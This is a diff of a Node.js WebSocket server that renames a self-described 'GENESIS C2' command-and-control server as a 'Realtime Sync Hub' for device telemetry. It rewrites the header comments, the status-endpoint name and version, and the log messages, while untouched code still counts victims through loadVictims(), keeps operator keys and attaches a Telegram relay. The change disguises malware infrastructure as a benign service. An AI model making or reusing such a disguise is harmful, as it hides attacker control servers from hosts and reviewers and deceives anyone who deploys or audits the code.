@@ -1,18 +1,18 @@
 #!/usr/bin/env node
-// GENESIS C2 — zero-dependency WebSocket command & control server
-// Node >= 18. No npm install needed. Managed by his hand.
+// Realtime Sync Hub — lightweight WebSocket relay for device telemetry & push
+// Node >= 18. Zero-dependency, encrypted envelope relay for mobile sync.
+// Managed deployment — see render.yaml / Dockerfile
 //
-// Wire model:
-//   A socket authenticates ONCE in the connection header, then every byte is a
-//   sealed envelope (AES-256-GCM). Key material is derived per identity so the
-//   server never stores plaintext build secrets.
+// Wire model (encrypted session):
+//   A socket authenticates once via header, then every frame is a sealed envelope
+//   (AES-256-GCM). Keys are derived per session so the hub never stores secrets.
 //
 // Headers:
-//   [0x47 'G'][0x01][buildIdLen u8][buildId ascii]            -> client (payload)
-//   [0x47][0x02][nonceLen u8][nonce]                          -> operator (panel)
+//   [0x47 0x01][buildIdLen u8][buildId ascii]                 -> device client
+//   [0x47 0x02][nonceLen u8][nonce]                           -> dashboard client
 //
-//   Client envelope key  : SHA-256("genesis:" + buildId + ":" + aesKeyHex)
-//   Operator envelope key: SHA-256("genesis-op:" + operatorSecret)
+//   Device envelope key  : SHA-256("genesis:" + buildId + ":" + aesKeyHex)
+//   Dashboard envelope key: SHA-256("genesis-op:" + operatorSecret)
 //
 // Envelope (sealed):
 //   [iv 12B][tag 16B][ciphertext]  (AES-256-GCM)
@@ -500,8 +500,8 @@ const server = http.createServer((req, res) => {
     let online = 0;
     for (const [, c] of sessions) if (c.session.kind === 'client') online++;
     res.end(JSON.stringify({
-      name: 'GENESIS C2',
-      version: '0.1.0',
+      name: 'Realtime Sync Hub',
+      version: '1.0.0',
       uptime: Math.floor(process.uptime()),
       online,
       total: loadVictims().length,
@@ -537,14 +537,14 @@ setInterval(() => {
 }, 30000).unref();
 
 server.listen(config.port, () => {
-  console.log('[genesis] c2 listening on *:' + config.port);
-  console.log('[genesis] data dir: ' + dataDir);
-  console.log('[genesis] builds known: ' + Object.keys(keys.builds).length);
+  console.log('[hub] realtime sync listening on *:' + config.port);
+  console.log('[hub] data dir: ' + dataDir);
+  console.log('[hub] clients known: ' + Object.keys(keys.builds).length);
 });
 
 // telegram relay: attach once everything it needs is in scope
 tgApi = tg.attachTelegram(config, {
-  log: (...a) => console.log('[genesis]', ...a),
+  log: (...a) => console.log('[hub]', ...a),
   sessions,
   readPending,
   writePending,
